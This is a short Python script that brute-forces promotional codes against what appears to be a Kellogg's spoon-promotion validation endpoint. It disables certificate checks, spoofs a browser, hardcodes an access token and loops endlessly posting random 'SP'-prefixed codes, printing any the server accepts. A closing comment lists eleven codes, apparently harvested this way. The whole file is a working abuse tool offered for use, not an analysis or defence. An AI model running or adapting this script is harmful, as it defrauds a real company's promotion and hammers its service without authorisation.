import requests
import random
import string
import json
import os

base='https://spoons.kelloggs.com/de/upc/validate'
base_word='SP%s'

s=requests.session()
s.verify=False
s.headers.update({'Origin':'https://spoons.kelloggs.com','User-Agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36','access-token':'ytPgHVxjVgMsinc1uC02D8swBYJxynbn0sgeohuzSephC1PODpNGEYLIvmGd9Ei8WixY5vtg4Hz9gvIXMPPAKwOeEyEyZBBenhMQXO2HsMc=','Content-Type':'application/json;charset=UTF-8'})

def random_char(y):
	return ''.join(random.choice(string.ascii_uppercase) for x in range(y))

def check(code1,code2,code3):
	data='{"Codes":["%s","%s","%s"]}'%(code1,code2,code3)
	r=s.post(base,data=data)
	if 'Valid' in r.content:
		return json.loads(r.content)['statuses']
	else:
		return None
	
def main():
	while(1):
		code1=base_word%(random_char(8))
		code2=base_word%(random_char(8))
		code3=base_word%(random_char(8))
		res= check(code1,code2,code3)
		if res is not None:
			print '[!] found something:%s,%s %s,%s %s,%s'%(code1,res[0],code2,res[1],code3,res[2])
			#os.system("pause")
	
if __name__ == '__main__':
	main()
	
'''
SPADFQWRXE
SPBNLAPKRX
SPCJEZZDZX
SPDLJZGKTL
SPHIKJGMAA
SPHTJQAIXK
SPIDTIQRRR
SPLYNXXAHX
SPNZFNPHDL
SPSLQQOCCO
SPTOFGBQHO
'''